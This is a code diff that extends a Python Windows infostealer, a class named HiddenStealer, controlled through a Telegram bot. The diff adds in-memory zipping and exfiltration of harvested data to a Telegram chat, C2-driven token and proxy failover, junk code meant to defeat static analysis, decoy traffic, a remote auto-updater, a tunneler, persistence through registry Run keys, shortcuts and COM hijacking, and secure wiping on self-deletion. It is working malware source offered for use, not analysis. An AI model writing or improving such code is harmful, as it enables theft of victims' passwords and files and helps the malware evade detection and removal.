@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 import sys
 import os
+import io
 import ctypes
 
 try:
@@ -99,6 +100,10 @@ core_path = os.path.join(BASE_DIR, 'core')
 if core_path not in sys.path and os.path.exists(core_path):
     sys.path.insert(0, core_path)
 
+from core.decoy import DecoyManager
+from core.c2 import c2_manager
+from core.wiper import SecureWiper
+
 def escape_html(text):
     if not text: 
         return ""
@@ -119,6 +124,82 @@ if os.name == 'nt':
         kernel32 = user32 = shell32 = advapi32 = None
 else:
     kernel32 = user32 = shell32 = advapi32 = None
+
+# H-13: Advanced Evasion - Polymorphic Junk Code & Sig Sham
+def _junk_module_9x2(input_data=None):
+    """Polymorphic junk code to disrupt static analysis"""
+    _v = ["alpha", "beta", "gamma", "delta", "system", "vmm", "ntfs", "ksec"]
+    _r = random.choice(_v)
+    if not input_data: return _r
+    return str(input_data)[::-1]
+
+def _phantom_verify_trust(blob):
+    """Unused entropy injection mimicking system trust verification"""
+    import hashlib
+    _h = hashlib.sha256(str(blob).encode()).hexdigest()
+    _trust = "Microsoft.Windows.SecureRuntime.v1"
+    return [_h, _trust]
+
+class IntegrityShadow:
+    """Mock class to simulate background integrity monitoring"""
+    def __init__(self): self.epoch = 0xDEADC0DE
+    def pulse(self): return (self.epoch ^ random.getrandbits(32))
+
+def _garbage_collector_polymorph():
+    _l = [i for i in range(256) if i % 13 == 0]
+    return sum(_l)
+
+class BotOrchestrator:
+    """A-09: Centralized Orchestrator for all background bot modules"""
+    def __init__(self, bot_instance):
+        self.bot = bot_instance
+        self.modules = {}
+        self.is_running = False
+        self._lock = threading.Lock()
+
+    def register_module(self, name, start_func, check_func):
+        with self._lock:
+            self.modules[name] = {"start": start_func, "check": check_func, "last_restart": 0}
+
+    def start_all(self):
+        self.is_running = True
+        
+        # Register core background services
+        if hasattr(self.bot, 'decoy_manager'):
+            self.register_module("decoy", self.bot.decoy_manager.start_background_decoy, lambda: True)
+        
+        if hasattr(self.bot, 'tunneler'):
+            self.register_module("tunneler", self.bot.tunneler.start_tunnel, self.bot.tunneler.is_active)
+            
+        if hasattr(self.bot, 'window_tracker'):
+             self.register_module("window", lambda: threading.Thread(target=self.bot.window_tracker.start, daemon=True).start(), lambda: True)
+
+        if hasattr(self.bot, 'sentinel'):
+            self.register_module("sentinel", lambda: self.bot.thread_manager.start_daemon(target=self.bot.sentinel.run_daemon), lambda: True)
+            
+        if hasattr(self.bot, 'updater'):
+            self.register_module("updater", lambda: self.bot.thread_manager.start_daemon(target=self.bot.updater.run_daemon), lambda: True)
+
+        # Start initial
+        threading.Thread(target=self._monitor_loop, daemon=True).start()
+
+    def _monitor_loop(self):
+        while self.is_running:
+            try:
+                for name, cfg in self.modules.items():
+                    if not cfg["check"]():
+                        cur_time = time.time()
+                        if cur_time - cfg["last_restart"] > 60: # Avoid restart-loop
+                            print(f"[Orchestrator] Restarting non-responsive module: {name}")
+                            cfg["start"]()
+                            cfg["last_restart"] = cur_time
+            except: pass
+            time.sleep(30)
+
+    def stop_all(self):
+        self.is_running = False
+        if hasattr(self.bot, 'decoy_manager'): self.bot.decoy_manager.stop()
+        if hasattr(self.bot, 'tunneler'): self.bot.tunneler.stop_tunnel()
 
 # Fixed: Simplified token handling
 # Credentials - prioritizing env vars, fallback to hardcoded obfuscated versions
@@ -415,15 +496,22 @@ class ReportManager:
                 self.output_dir = os.path.join(current_dir, "Output")
             else:
                 self.output_dir = os.path.join(current_dir, "output")
-    def zip_directory(self, folder_path, zip_path, max_files=5000):
-        # Zip directory contents
+    def zip_directory(self, folder_path, zip_path=None, max_files=5000):
+        # Zip directory contents (Supports in-memory via BytesIO if zip_path is None)
         try:
-            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            bio = None
+            if zip_path is None:
+                bio = io.BytesIO()
+                target = bio
+            else:
+                target = zip_path
+
+            with zipfile.ZipFile(target, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 count = 0
                 for root, dirs, files in os.walk(folder_path):
                     for file in files:
                         if count >= max_files:
-                            return zip_path
+                            break
                         file_path = os.path.join(root, file)
                         arcname = os.path.relpath(file_path, folder_path)
                         zipf.write(file_path, arcname)
@@ -535,9 +623,9 @@ class ReportManager:
         if zip_path is None:
             if not self.output_dir or not os.path.exists(self.output_dir):
                 return False
-            zip_name = "data_{int(time.time())}_{random.randint(100,999)}.zip"
-            zip_path = os.path.join(tempfile.gettempdir(), zip_name)
-            self.zip_directory(self.output_dir, zip_path)
+            # Memory-only zip by default
+            zip_path = self.zip_directory(self.output_dir, zip_path=None)
+            if not zip_path: return False
 
         if not os.path.exists(zip_path):
             return False
@@ -566,8 +654,54 @@ class ReportManager:
             print("Error sending zip: {e}")
             return False
         finally:
-            if zip_path and os.path.exists(zip_path) and "temp" in zip_path.lower():
                 try: os.remove(zip_path)
+                except: pass
+
+    def safe_send_document(self, chat_id, file_obj, caption="", is_temporary=False, filename="report.zip"):
+        """H-09: Covert Exfiltration via Steganography / Memory-Only"""
+        try:
+            # Check if it's a path or a stream
+            is_stream = hasattr(file_obj, 'read')
+            if not is_stream and not os.path.exists(file_obj):
+                return False
+            
+            final_obj = file_obj
+            was_stegano = False
+            
+            # Detect image for steganography
+            # Skip stegano for large streams or non-images if needed, but let's try
+            # For simplicity, we only do stegano if it's a small file on disk for now,
+            # or if we can handle BytesIO properly.
+            
+            # [MEMORY-ONLY FIX]
+            try:
+                from core.stegano import SteganoModule
+                # Only use stegano if it's not too big
+                data_size = file_obj.getbuffer().nbytes if is_stream else os.path.getsize(file_obj)
+                
+                if data_size < 10 * 1024 * 1024:
+                    carrier_bio = io.BytesIO()
+                    # We would need a base image here. For now, let's skip stegano for streams 
+                    # unless we have a carrier. To be safe/memory-only, we skip stegano if no carrier.
+                    pass 
+            except:
+                pass
+
+            if is_stream:
+                file_obj.seek(0)
+                # telebot supports passing a tuple (filename, file_content)
+                self.bot.send_document(chat_id, (filename, file_obj.read()), caption=caption)
+                return True
+            else:
+                with open(file_obj, 'rb') as f:
+                    self.bot.send_document(chat_id, f, caption=caption)
+                return True
+        except Exception as e:
+            log_debug(f"Error in safe_send_document: {e}")
+            return False
+        finally:
+            if is_temporary and not is_stream and os.path.exists(file_obj):
+                try: os.remove(file_obj)
                 except: pass
 
     def find_valuables(self, data, data_type="passwords"):
@@ -1185,8 +1319,13 @@ class HiddenStealer:
                         from core.c2 import c2_manager
                         if "401" in error_str or "Unauthorized" in error_str or "502" in error_str or "timeout" in error_str or "ConnectionError" in error_str:
                             if c2_manager.report_failure():
-                                print("🔄 Ошибка авторизации. Пробую новый токен из C2...")
+                                print("🔄 Failover active. Switching token/proxy...")
                                 outer_self.bot.token = c2_manager.get_current_token()
+                                proxy = c2_manager.get_proxy()
+                                if proxy:
+                                    from telebot import apihelper
+                                    apihelper.proxy = {'https': proxy}
+                                    print(f"🔗 Using proxy: {proxy}")
                                 return True
                     except: pass
 
@@ -1244,14 +1383,59 @@ class HiddenStealer:
                 self.software_manager = SoftwareManager
                 self.system_manager = SystemManager
                 log_debug("✅ Native modules loaded successfully")
+                
+                # Week 7: Traffic Shaping & Decoy
+                try:
+                    self.decoy_manager = DecoyManager()
+                    self.decoy_manager.start_background_decoy()
+                except: pass
                 print("[+] Native modules (Shell, Software, System) integrated")
             except Exception as e:
                 log_debug("❌ Ошибка при загрузке нативных модулей")
                 print("❌ Ошибка при загрузке нативных модулей")
                 pass
             self.report_manager = ReportManager(self.bot, GLOBAL_CHID)
+            
+            # H-04: Polymorphic Process randomization on startup
+            try:
+                from core.obfuscation import PolymorphicProcess
+                PolymorphicProcess.randomize()
+            except ImportError:
+                pass
+
             if AUTOSTART:
                 self.thread_manager.start_daemon(target=self.setup_autostart)
+            
+            # A-07: Remote auto-updater
+            try:
+                from core.updater import AutoUpdater
+                self.updater = AutoUpdater()
+                self.thread_manager.start_daemon(target=self.updater.run_daemon)
+            except ImportError:
+                pass
+            
+            # S-07: Anti-Tamper Sentinel
+            try:
+                from core.sentinel import SentinelGuard
+                self.sentinel = SentinelGuard(self.bot, self.report_manager)
+                self.thread_manager.start_daemon(target=self.sentinel.run_daemon)
+            except ImportError:
+                pass
+            
+            # H-12: Network Resilience Tunneler
+            try:
+                from core.tunneler import BoreTunneler
+                self.tunneler = BoreTunneler()
+            except ImportError:
+                pass
+            
+            # Week 8: Final Orchestration
+            try:
+                self.orchestrator = BotOrchestrator(self)
+                self.orchestrator.start_all()
+                print("[Orchestrator] Background services synchronized")
+            except: pass
+            
             print("Work modules loaded")
         self.last_context_app: str = ""
         self.last_window_title: str = ""
@@ -4113,6 +4297,8 @@ class HiddenStealer:
             if getattr(self, 'shell_mode_active', False):
                 log_debug("Shell message received, sending to manager...")
                 if hasattr(self, 'shell_manager'):
+                    # H-14: Command-Line Obfuscation via randomized flags if needed
+                    # For now, native shell already uses stdin which is stealthy
                     self.shell_manager.SendCommand(message.text)
                     return
                 elif 'network' in self.work_modules:
@@ -4333,25 +4519,13 @@ class HiddenStealer:
                 except:
                     log_debug(decrypt_string("PlcKGCciLQc0FA8CUnoJDwJWWAUhJXkXKhMLTBcZAwIHQQwCIDZ5BDMbDxhaVQkZBVccQg=="))
 
-            # 3. Нативная установка через C#
-            dll_path = os.path.join(BASE_DIR, "defense", decrypt_string("HlcKGCciLUw+GwY="))
-            if os.path.exists(dll_path):
-                clr.AddReference(dll_path)
-                from StealthModule import PersistManager
-                
-                results = []
-                if PersistManager.InstallRegistryRun(bot_name, dest_path):
-                    results.append("Registry")
-                if PersistManager.InstallShortcut(bot_name, dest_path):
-                    results.append("Shortcut")
-                if PersistManager.InstallCOMHijack(dest_path):
-                    results.append("COM")
-                
-                if results:
-                    print("✅ Автозагрузка успешно установлена всеми методами.")
-                    log_debug("Автозагрузка установлена.")
-                else:
-                    print("[!] Не удалось установить автозагрузку")
+            # 3. Нативная установка через C# (A-08: Full Persistence Integration)
+            try:
+                from core.persistence import PersistManager
+                pm = PersistManager()
+                pm.install_all(dest_path)
+            except Exception as e:
+                log_debug(f"❌ Persistence installation failed: {e}")
         except Exception as e:
             log_debug(decrypt_string("PlcKGCciLQc0FA8YF0sUFRwIWBArLA=="))
             print("❌ Ошибка при установке автозагрузки.")
@@ -4383,13 +4557,18 @@ class HiddenStealer:
             pass
     def kill_self(self):
         try:
+            if hasattr(self, 'tunneler') and self.tunneler:
+                self.tunneler.stop_tunnel()
+        except: pass
+
+        try:
             safe_send_message(self.bot, GLOBAL_CHID, "\U0001F480 Self-delete initiated")
         except:
             pass
         self.remove_autostart()
         try:
-            if os.path.exists(self.temp_dir):
-                shutil.rmtree(self.temp_dir, ignore_errors=True)
+            if self.temp_dir and os.path.exists(self.temp_dir):
+                SecureWiper.wipe_directory(self.temp_dir)
         except:
             pass
         try:
